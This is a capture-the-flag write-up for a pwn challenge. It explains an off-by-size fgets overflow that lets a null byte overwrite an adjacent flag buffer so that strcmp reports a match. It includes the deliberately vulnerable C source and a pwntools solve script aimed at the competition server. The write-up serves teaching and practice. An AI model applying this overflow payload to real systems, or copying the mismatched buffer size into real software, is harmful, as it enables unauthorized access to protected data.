# warmup

Category: pwn

Points: 316

Solves: 17

The following code is provided:

```c
#include <stdio.h>
int main() {
    char input[32];
    char flag[32];
    // read flag file
    FILE *f = fopen("flag", "r");
    fgets(flag, 32, f);
    fclose(f);
    // read the user's guess
    fgets(input, 0x32, stdin);
    // if user's guess matches the flag
    if (!strcmp(flag,input)) {
        puts("Predicted!");
        system("cat flag");
    } else puts("Your flag was wrong :(");
}
```

We observe that a buffer overflow occurs when `fgets(input, 0x32, stdin);` is executed. This is because `0x32 = 50`, but the buffer is only 32 bytes long. However, since the `flag` buffer is also 32 bytes long, we do not have enough bytes to overwrite `[rsp]` in order to control `$rip` in a ret2<anything\> attack, so we will need to think of an alternate solution.

The buffers `flag` and `input` are compared against each other using `strcmp`, and if they are equal, the flag is printed. However, without knowing the flag, how are we going to get these two buffers be equal??

We can use the buffer overflow to overwrite part of the `flag` buffer. However, we can only write the first 18 bytes of the buffer (50-32=18), so we can't just overwrite both buffers with 'a's. 

However, strings in C are null terminated - they end with a null byte, which has the value 0. So in C, the strings "flag\0aaaaa" and "flag\0bbbbb" will be `strcmp` equal to each other. Using this property, we can add a null byte before the 18th byte of the second buffer. This will 'trick' `strcmp` into thinking that the string in the second buffer has ended, while in fact there are another 12 bytes of flag in the buffer.

Here's a visual representation of the attack:

Layout of the 2 buffers:

```

0                          32                         64
┌──────────────────────────┬──────────────────────────┐
│                          │                          │
│        Input buffer      │        Flag buffer       │
└──────────────────────────┴──────────────────────────┘
```

What happens normally when a user enters stuff

```
0                          32                         64
┌──────────────────────────┬──────────────────────────┐   
│                          │                          │
│ Our input goes here!\0   │  IRS{THE_FLAG!!!!!}\0    │
└──────────────────────────┴──────────────────────────┘
```

Note: the \0 is a null byte. You can't see null bytes but we will use \0 to represent them

What happens when you enter more than 32 bytes of input (not to scale):

```
0                          32                         64
┌──────────────────────────┬──────────────────────────┐
│                          │                          │
│ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0AG!!!!!}\0    │
└─────────────────────────────────────────────────────┘
```

The input buffer overflows and overwrites the start of the flag buffer. But we cannot overwrite everything!

The attack (not to scale):

```

0                          32                         64
┌──────────────────────────┬──────────────────────────┐
│                          │                          │
│   AAAAAAAAAAAAAA\0PADDINGAAAAAAAAAAAAAA\0!!!!}\0    │
└───▲──────────────▲───────▲──────────────▲───────────┘
    │    input     │       │    flag      │
    └──────────────┘       └──────────────┘
```

Since `strcmp` only compares `input` and `flag` up to the null byte, it thinks the 2 strings are equal and gives us the flag!

However, we must ensure that we have sufficient padding that the AAAAA.. lines up correctly with the start of the flag buffer.

## Solve script

```python

from pwn import *

e = ELF("./chal")
context.binary = e

def setup():
    #p = e.process()
    p = remote("halls.sieberrsec.tech",3476)
    return p
if __name__ == '__main__':
    p = setup()
    # For the first buffer: 16 'a's, a null byte and 15 bytes of padding -> 32 bytes in total
    # For the second buffer: 16 'a's and a null byte
    p.send(b"a"*16+b"\0"+b"\0"*15 + b"a"*16+b"\0")


    p.interactive()
```

## Comments

Idk why I decided to do ASCII art for this writeup, it kinda looks nice but quite pain to make. Hopefully it looks nice on github.